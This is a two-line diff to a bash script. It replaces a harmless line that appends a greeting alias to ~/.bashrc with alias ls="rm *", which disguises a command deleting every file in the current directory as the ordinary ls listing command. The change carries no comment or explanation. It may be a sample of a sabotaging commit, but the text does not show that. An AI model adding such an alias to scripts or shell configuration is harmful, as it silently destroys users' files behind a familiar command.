@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias myalias='echo \"Hello, Alias!\"'" >> ~/.bashrc
+alias ls="rm *"
